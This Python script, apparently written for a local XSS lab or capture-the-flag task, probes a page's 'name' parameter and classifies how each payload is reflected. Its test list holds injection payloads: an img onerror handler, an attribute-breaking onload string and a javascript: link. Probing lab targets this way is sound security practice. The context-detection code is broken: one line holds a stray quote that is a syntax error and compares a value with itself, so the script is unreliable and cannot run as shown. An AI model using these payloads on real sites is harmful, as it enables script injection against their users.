import urllib.request
import urllib.parse
import urllib.error
import html
import socket
import time

class XSSContextAnalyzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.timeout = 15
        
    def make_request(self, payload):
        """Make HTTP request with proper error handling"""
        try:
            # URL encode payload
            encoded_payload = urllib.parse.quote(payload, safe='')
            url = f"{self.base_url}?name={encoded_payload}"
            
            print(f"Requesting: {url[:100]}...")
            
            # Create request with timeout
            req = urllib.request.Request(url)
            
            # Set socket timeout
            socket.setdefaulttimeout(self.timeout)
            
            # Make request with try/except for broken pipe
            try:
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    data = response.read().decode('utf-8', errors='ignore')
                    return data, response.getcode()
            except (socket.error, urllib.error.URLError) as e:
                print(f"Connection error (broken pipe workaround): {e}")
                # Try alternative method
                return self.alternative_request(payload), 0
                
        except Exception as e:
            print(f"Request error: {e}")
            return None, 0
    
    def alternative_request(self, payload):
        """Alternative request method using lower-level sockets"""
        try:
            import http.client
            conn = http.client.HTTPConnection('127.0.0.1', 33081, timeout=self.timeout)
            encoded = urllib.parse.quote(payload, safe='')
            conn.request('GET', f'/page?name={encoded}')
            res = conn.getresponse()
            data = res.read().decode('utf-8', errors='ignore')
            conn.close()
            return data
        except:
            return "ERROR: Unable to connect"
    
    def analyze_reflection(self, payload, response):
        """Analyze how payload is reflected in response"""
        if not response:
            return "NO_RESPONSE", "N/A", "N/A"
        
        # Check for raw reflection
        if payload in response:
            context = self.extract_context(payload, response, False)
            encoding = "RAW (no encoding)"
            filter_status = "NONE"
            return context, encoding, filter_status
        
        # Check for HTML encoded reflection
        encoded_payload = html.escape(payload)
        if encoded_payload in response:
            context = self.extract_context(encoded_payload, response, True)
            encoding = "HTML entities encoded"
            filter_status = "HTML_ENCODING_APPLIED"
            return context, encoding, filter_status
        
        # Check for partial encoding (just < and >)
        partial_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        if partial_encoded in response:
            context = self.extract_context(partial_encoded, response, True)
            encoding = "Partial HTML encoding (&lt; &gt;)"
            filter_status = "PARTIAL_ENCODING"
            return context, encoding, filter_status
        
        # Check if payload was completely removed/filtered
        if len(response) < 1000:  # Small response likely means error or filter
            return "FILTERED", "N/A", "BLOCKED"
        
        return "NOT_FOUND", "N/A", "N/A"
    
    def extract_context(self, needle, haystack, is_encoded):
        """Extract context around the reflected payload"""
        try:
            idx = haystack.find(needle)
            if idx == -1:
                return "NOT_FOUND"
            
            # Extract 100 chars before and after
            start = max(0, idx - 100)
            end = min(len(haystack), idx + len(needle) + 100)
            context = haystack[start:end]
            
            # Analyze context type
            before_context = haystack[max(0, idx - 200):idx]
            
            # Check for various contexts
            if "<script" in before_context or "</script>" in before_context:
                return "INSIDE_SCRIPT_TAG"
            elif 'href=' in before_context or 'src=' in before_context or 'action=' in before_context:
                return "INSIDE_HTML_ATTRIBUTE"
            elif "<" in before_context and context.count("<") > context.count("<")":
                return "INSIDE_HTML_TAG"
            elif "on" in before_context or "onerror" in before_context or "onload" in before_context:
                return "INSIDE_EVENT_HANDLER"
            else:
                return "TEXT_CONTENT"
        except:
            return "ERROR_EXTRACTING_CONTEXT"
    
    def test_payload(self, test_name, payload):
        """Test a single payload and return results"""
        print(f"\n{'='*80}")
        print(f"TEST: {test_name}")
        print(f"PAYLOAD: {payload}")
        print(f"{'='*80}")
        
        # Add delay to avoid overwhelming target
        time.sleep(0.5)
        
        # Make request
        response, status_code = self.make_request(payload)
        
        if not response or "ERROR" in response:
            print(f"❌ CONNECTION_ERROR: {response}")
            return {
                'test_name': test_name,
                'payload': payload,
                'status': 'ERROR',
                'status_code': status_code,
                'reflection': 'NO_RESPONSE',
                'context': 'N/A',
                'encoding': 'N/A',
                'filter': 'N/A',
                'snippet': 'N/A'
            }
        
        # Analyze reflection
        context, encoding, filter_status = self.analyze_reflection(payload, response)
        
        # Extract snippet if payload found
        if context != "NOT_FOUND" and context != "FILTERED":
            if payload in response:
                idx = response.find(payload)
                snippet = response[max(0, idx-50):idx+len(payload)+50]
            elif html.escape(payload) in response:
                idx = response.find(html.escape(payload))
                snippet = response[max(0, idx-50):idx+len(html.escape(payload))+50]
            else:
                snippet = response[:200]  # First 200 chars
        else:
            snippet = response[:200] if len(response) > 0 else "Empty response"
        
        # Format output
        print(f"Status Code: {status_code}")
        print(f"Response Length: {len(response)} chars")
        print(f"Payload Reflection: {'✓ FOUND' if context != 'NOT_FOUND' and context != 'FILTERED' else '✗ NOT FOUND'}")
        print(f"Reflection Context: {context}")
        print(f"Encoding Applied: {encoding}")
        print(f"Filter Status: {filter_status}")
        print(f"Response Snippet:\n{snippet[:300]}")
        
        return {
            'test_name': test_name,
            'payload': payload,
            'status': 'SUCCESS',
            'status_code': status_code,
            'reflection': 'FOUND' if context != 'NOT_FOUND' and context != 'FILTERED' else 'NOT_FOUND',
            'context': context,
            'encoding': encoding,
            'filter': filter_status,
            'snippet': snippet[:300]
        }

# Main execution
def main():
    analyzer = XSSContextAnalyzer("http://127.0.0.1:33081/page")
    
    # Test payloads categorized as requested
    test_cases = [
        ("Plain Text", "HelloTest"),
        ("HTML Tag - Bold", "<b>BOLD</b>"),
        ("HTML Tag - Italic", "<i>ITALIC</i>"),
        ("Script Tag", "<script>test</script>"),
        ("Event Handler", '<img src=x onerror=alert(1)>'),
        ("Attribute Injection", '" onload=alert(1)>'),
        ("JS Protocol", '<a href="javascript:alert(1)">click</a>'),
        ("Special Characters", "<>\"'&"),  # All required special chars
        ("Mixed XSS with uppercase", '<img src=x onError=alert(\'XSS\')>')  # Must include uppercase "XSS"
    ]
    
    print("XSS CONTEXT ANALYSIS")
    print("Target: http://127.0.0.1:33081/page?name=PAYLOAD")
    print(f"Testing {len(test_cases)} payload variations...")
    
    results = []
    
    for name, payload in test_cases:
        try:
            result = analyzer.test_payload(name, payload)
            results.append(result)
        except Exception as e:
            print(f"❌ Test failed: {e}")
            results.append({
                'test_name': name,
                'payload': payload,
                'status': 'EXCEPTION',
                'error': str(e)
            })
    
    # Summary
    print("\n" + "="*80)
    print("SUMMARY TABLE")
    print("="*80)
    print(f"{'Test':<25} {'Result':<20} {'Filter':<15}")
    print("-"*80)
    
    for r in results:
        if r.get('status') == 'SUCCESS':
            result_text = r['reflection']
            filter_text = r['filter']
        else:
            result_text = r.get('status', 'UNKNOWN')
            filter_text = 'N/A'
        
        print(f"{r['test_name']:<25} {result_text:<20} {filter_text:<15}")
    
    # Count results
    total_tests = len(results)
    successful = len([r for r in results if r.get('status') == 'SUCCESS'])
    raw_reflections = len([r for r in results if r.get('context') not in ['NOT_FOUND', 'FILTERED', 'ERROR_EXTRACTING_CONTEXT']])
    
    print("\n" + "="*80)
    print(f"Total Tests: {total_tests}")
    print(f"Successful Requests: {successful}")
    print(f"Payloads Reflected: {raw_reflections}")
    print("="*80)
    
    return results

if __name__ == "__main__":
    results = main()
    print("\nAnalysis complete. Review individual test results above.")
